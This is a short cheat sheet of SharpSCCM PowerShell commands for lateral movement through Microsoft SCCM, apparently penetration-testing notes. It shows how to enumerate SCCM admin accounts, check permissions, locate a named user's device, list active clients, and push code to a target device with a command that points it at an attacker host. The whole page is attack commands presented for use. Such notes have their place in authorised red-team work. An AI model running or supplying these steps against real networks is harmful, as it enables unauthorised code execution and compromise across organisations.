# Lateral Movement

## Enumeration

```powershell
# enumerate admin and special accounts
.\SharpSCCM.exe get class-instances SMS_ADMIN
.\SharpSCCM.exe get class-instances SMS_SCI_Reserved
```

## Application Deployment

> After the enumeration phase it's time to move laterally. Currently the only method I know of to abuse SCCM components for lateral movement is by creating and deploying an application/script to execute code on another device.

```powershell
# Confirm access permissions - Confirm your current account holds sufficient SCCM administrative permission to pull off your execution plan:
.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames

# Find target devices to exploit, must be active and online
## Search for device of user "Frank.Zapper"
.\SharpSCCM.exe get primary-users -u Frank.Zapper

## List all active SCCM devices where the SCCM client is installed 
### CAUTION: This could be huge
.\SharpSCCM.exe get devices -w "Active=1 and Client=1"

# Deploy Application to target device
.\SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
```
